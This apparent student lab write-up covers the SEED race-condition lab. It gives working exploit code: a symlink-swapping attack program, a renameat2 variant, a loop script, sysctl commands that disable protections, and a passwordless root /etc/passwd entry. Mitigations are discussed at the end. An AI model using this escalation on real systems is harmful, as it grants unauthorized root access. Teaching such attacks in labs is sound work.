# Race Condition Vulnerability Lab

This week's suggested lab was Race Condition Vulnerability Lab, from SEED labs, with the intent of providing us a first-hand experience on race-condition vulnerability.

### Introduction

In this lab, we are given a program with a race-condition vulnerability and our task is to develop a scheme to exploit the vulnerability and gain root privilege. To start off, we need to turn off some OS countermeasures that will be further detailed in task 3. For that we run the `sudo sysctl -w fs.protected_symlinks=0` and `sudo sysctl fs.protected_regular=0` commands. The first protection makes "symlinks in world-writable sticky directories (e.g.,`/tmp`) not to be followed if the follower and directory owner do not match the symlink owner." The second prevents the root from writing to the files in `/tmp` that are owned by others.

# Tasks

## Task 1

In this first task, our goal is to modify the `/etc/passwd` file with `test:U6aMy0wojraho:0:0:test:/root:/bin/bash` and verify that when switching to the account test there is no need to type the password (just need to press the Enter key).

```
┌──(root㉿kali)-[/etc]
└─# echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" >> passwd             
┌──(root㉿kali)-[/etc]
└─# cat passwd
root:x:0:0:root:/root:/usr/bin/zsh

...

test:U6aMy0wojraho:0:0:test:/root:/bin/bash
┌──(kali㉿kali)-[/etc]
└─$ su test
Password: 
┌──(root㉿kali)-[/etc]
└─#   
```

## Task 2

The goal of the second task is to use the `Set-UID Program` to exploit the vulnerability brought upon by calling `access()`, that checks whether the real user ID indeed has the right to open the `/tmp/XYZ` file, and `fopen()`. This vulnerability is caused by the fact that the time window between the check and use does not guarantee that the file is checked by `access()` is the same as the being written with `fopen()`. 

### Task 2.A

In this task we add a `sleep()` call in the middle of the code to make us change the symbolic link during that "pause" and allow us to write on the `/etc/passwd` file. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    /* get user input */
    scanf("%50s", buffer);

    if (!access(fn, W_OK)) {
        sleep(10);
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }

    return 0;
}
```

We first compile the program with the `gcc vulp.c -o vulp` command, and make it a Set-UID program by issuing the `sudo chown root vulp` and `sudo chmod 4755 vulp` commands. In this case, the effective user ID will be the root's user ID (0). Afterward, when executing the vulnerable `vulp` script, we have to keep in mind that the input passed to the vulnerable program will further be written to the `/tmp/XYZ` program and is the same as the one we inserted manually: `test:U6aMy0wojraho:0:0:test:/root:/bin/bash`. After the execution, the `/etc/passwd` file is indeed modified and we are now able to switch to the test user which detains root privileges.

```
┌──(kali㉿kali)-[~/…/seed-labs/category-software/Race_Condition/Labsetup]
└─$ ./vulp
test:U6aMy0wojraho:0:0:test:/root:/bin/bash
                                                                                                                                           
┌──(kali㉿kali)-[~/…/seed-labs/category-software/Race_Condition/Labsetup]
└─$ su test             
Password: 
┌──(root㉿kali)-[/home/kali/Documents/seed-labs/category-software/Race_Condition/Labsetup]
└─# 
```

But behind the scenes, we have to do something manually. Initially we executed the `ln -sf /dev/null /tmp/XYZ` which maps the `/tmp/XYZ` file to the `/dev/null` file. But when the vulnerable program is stuck in the 10-second sleep call, we change the `/tmp/XYZ` link to map to the `/etc/passwd` file using the command `ln -sf /etc/passwd /tmp/XYZ`. Later on, the vulnerable script will append the line `test:U6aMy0wojraho:0:0:test:/root:/bin/bash` to the `/etc/passwd` file making the attack successful.


### Task 2.B

In the previous attack, we manually changed the symbolic link from `/tmp/XYZ` to `/dev/null`. In this one, we modify the program to do it for us.

Attack script (`attack.c`):

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>

int main()
{
    while(true) {
        unlink("/tmp/XYZ");
        symlink("/dev/null","/tmp/XYZ");
        
        unlink("/tmp/XYZ");
        symlink("/etc/passwd","/tmp/XYZ");
    }

    return 0;
}
```

Script to run vulnerable program in loop (`target_process.sh`):

```bash
#!/bin/bash

CHECK_FILE="ls -l /etc/passwd"
old=$($CHECK_FILE)
new=$($CHECK_FILE)
while [ "$old" == "$new" ]  
do
   echo "test:U6aMy0wojraho:0:0:test:/root:/bin/bash" | ./vulp 
   new=$($CHECK_FILE)
done
echo "STOP... The passwd file has been changed"
```

After several attempts to get the attack to succeed because of the issue caused when the owner of the symbolic link is the root, that takes off the ability of our attacking program to make changes to the `/tmp/XYZ` symlink, as we will further detail in the next task, we finally got our program to succeed and add the desired line to the `/etc/passwd` file.

In one terminal we run the `target_process.sh` and in another, we first compile the attack script by issuing the `gcc attack.c -o attack` command and then we run it. The result is as follows:

```
┌──(kali㉿kali)-[~/…/seed-labs/category-software/Race_Condition/Labsetup]
└─$ ./target_process.sh
STOP... The passwd file has been changed
```

As a result, when we inspect the `/etc/passwd` file we see that the new high-privileged test user is created.

```
┌──(kali㉿kali)-[~]
└─$ cat /etc/passwd
root:x:0:0:root:/root:/usr/bin/zsh
...
kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh

test:U6aMy0wojraho:0:0:test:/root:/bin/bash  
```

### Task 2.C

By changing the attacking script to the following one we were able to correct the annoying issue that we were presented in the previous task, which was related to the fact that the `/tmp/XYZ` was being unlinked after the `access()`, but before the `fopen()` calls. Consequently, the program would create a root-owned file, due to the presence of the `a+` flag in the `fopen()` and our attack would fail. By switching atomically the `/tmp/XYZ` link in a loop between the `/dev/null` and `/etc/passwd` files we were able to get our attack to succeed much faster this time. This is since now there's isn't a gap between the `unlink()` and `symlink()` calls which was the problem in the previous task. The fact that now this switching of where the link is pointing to happens atomically makes our race-condition not to happen.

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdbool.h>

int main()
{
    unsigned int flags = RENAME_EXCHANGE;
    unlink("/tmp/XYZ"); symlink("/dev/null", "/tmp/XYZ");
    unlink("/tmp/ABC"); symlink("/etc/passwd", "/tmp/ABC");
    
    while(true) {
        renameat2(0, "/tmp/XYZ", 0, "/tmp/ABC", flags);
    }

    return 0;
}
```



## Task 3

### Task 3.A

For applying the Least-Privilege Principe, calling the `seteuid` with the real user id of the user should be sufficient to mitigate the attack. 

Therefore, our code becomes:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main()
{
    uid_t real_uid = getuid();
    uid_t eff_uid = geteuid();

    seteuid(real_uid);

    char* fn = "/tmp/XYZ";
    char buffer[60];
    FILE* fp;

    /* get user input */
    scanf("%50s", buffer);

    if (!access(fn, W_OK)) {
        fp = fopen(fn, "a+");
        if (!fp) {
            perror("Open failed");
            exit(1);
        }
        fwrite("\n", sizeof(char), 1, fp);
        fwrite(buffer, sizeof(char), strlen(buffer), fp);
        fclose(fp);
    } else {
        printf("No permission \n");
    }

    seteuid(eff_uid);

    return 0;
}
```

We first set the eUID set to the rUID, essentially dropping privileges and at the end, we re-enable the privileges, as requested. By dropping privileges, the `access()` call will check whether the real user ID has the access permission to access the file `/tmp/XYZ`, and if this is a symlink pointing to the `/etc/passwd` file, it won't, and we will get a permission error. To demonstrate that, when trying the attack we get the following output:

```
┌──(kali㉿kali)-[~/…/seed-labs/category-software/Race_Condition/Labsetup]
└─$ ./target_process.sh
Open failed: Permission denied
No permission 
No permission 
Open failed: Permission denied
No permission 
Open failed: Permission denied
...
``` 

The `Open failed: Permission denied` message refers to the unsuccessful `fopen` call and the `No permission` to the `access` call.

### Task 3.B

When executing the command `sudo sysctl -w fs.protected_symlinks=1`, the built-in protection against race condition gets turned on so the attack will fail as before.

#### **How does this protection scheme work?**

When this protection is set, **symlinks are permitted to be followed only when outside a sticky world-writable directory**, or **when the process following the symbolic link (eUID - effective user ID) is the owner of the symbolic link**, or **when the directory owner matches the symlink’s owner**.
A sticky world-writable directory prevents files from being deleted or moved by anyone except the owner of the file, or the `root` role. This is useful in directories that are common to many users, such as the `/tmp` directory, as demonstrated in the "t" when executing the following command.

```
┌──(kali㉿kali)-[/tmp]
└─$ ls -ld /tmp       
drwxrwxrwt 15 root root 4096 Mar 20 06:40 /tmp
```

In our situation, as our link is in a sticky world-writable directory (`/tmp`), and the follower's eUID is different from the symlink's owner (`root` != `kali`) and the `/tmp` folder owner is different from the symlink's owner (`root` != `kali`), therefore our attack will not succeed.

#### **What are the limitations of this scheme?**

- Violates POSIX:
    - POSIX didn't consider this situation, and it's not useful to follow a broken specification at the cost of security. 
- Might break unknown applications that use this feature.
    - Applications that break because of the change are easy to spot and fix. Applications that are vulnerable to symlink ToCToU (Time-of-check to time-of-use) by not having the change aren't.
- Applications should just use mkstemp() or O_CREATE|O_EXCL (when used in `fopen` basically doesn't allow following symlinks).
    - Applications are not perfect, and new software is written all the time that makes these mistakes; blocking this flaw at the kernel is a single solution to the entire class of vulnerability. 